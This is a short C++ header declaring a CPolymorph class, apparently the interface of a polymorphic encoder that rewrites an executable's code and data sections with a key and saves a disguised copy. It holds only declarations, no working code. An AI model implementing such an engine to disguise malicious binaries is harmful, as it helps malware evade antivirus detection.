#include "Include.h"

class CPolymorph
{
public:
	CPolymorph();
	CPolymorph(const char *szFile, const char *szOutFile);
	~CPolymorph();

	bool DoPolymorph(const char *szFile, const char *szOutFile);
protected:
	void BuildEncoder(char *szSectionData, int iSectionSize, DWORD dwOffset, DWORD dwOffsetCode, DWORD dwCodeSize, DWORD dwOffsetData, DWORD dwDataSize, DWORD dwEntryPoint, unsigned long lKey, unsigned long lType);

	int MapFile(const char *szFile, char **szBuffer);
	void UnmapFile();
	void SaveFile(const char *szFile);

	int		 m_iFileSize;
	char	*m_szBuffer;
};